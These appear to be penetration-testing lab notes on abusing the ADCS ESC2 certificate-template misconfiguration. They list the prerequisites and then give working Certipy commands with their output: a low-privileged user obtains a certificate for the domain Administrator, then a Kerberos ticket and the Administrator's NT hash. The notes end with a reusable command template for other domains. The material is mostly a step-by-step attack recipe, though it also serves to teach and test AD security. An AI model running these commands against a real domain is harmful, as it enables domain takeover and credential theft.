ESC2 in ADCS involves exploiting certificate templates that either specify the Any Purpose Extended Key Usage (EKU) or do not specify any EKU, allowing certificates to be used for various purposes, including client and server authentication and code signing. If these templates also permit specifying a `subjectAltName` (SAN) in the certificate signing request, attackers can request certificates on behalf of any user, similar to ESC1. Even without SAN specification, such certificates can be used to request new certificates. Additionally, a subordinate CA certificate with no EKUs can sign new certificates with arbitrary EKUs, posing significant security risks, although these won't work for domain authentication unless trusted by the NTAuthCertificates object.

Prerequisite:

- The Enterprise CA must provide enrollment rights to low-privileged users.
-  Manager approval should be turned off.
- No authorized signatures should be necessary.
- The security descriptor of the certificate template must be excessively permissive, allowing low-privileged users to enroll for certificates.
- The certificate template should define Any Purpose Extended Key Usage or have no Extended Key Usage specified.

![[Pasted image 20241005173442.png]]

### Certificate Request

Use the `-upn` to specify the alternative subject. In this case the Administrator:

```bash
garffff@garffff:~/GOAD/adcs/esc2$ certipy req -u khal.drogo@essos.local -p 'horse' -template ESC2 -ca ESSOS-CA -upn administrator@essos.local -dc-ip 192.168.56.23
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 12
[*] Got certificate with UPN 'administrator@essos.local'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'
```

### Certificate Authentication

We can retrieve the NTLMv1 hash for the targeted user:

```bash
garffff@garffff:~/GOAD/adcs/esc2$ certipy auth -pfx administrator.pfx -dc-ip 192.168.56.12
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@essos.local
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@essos.local': aad3b435b51404eeaad3b435b51404ee:54296a48cd30259cc88095373cec24da
```

### Summary

```bash
certipy req -u <user>@<domain> -p '<password>' -template <template> -ca <ca> -upn <target_user>@<domain -dc-ip <adcs_ip>
certipy auth -pfx <target_user>.pfx -dc-ip <dc_ip>
```
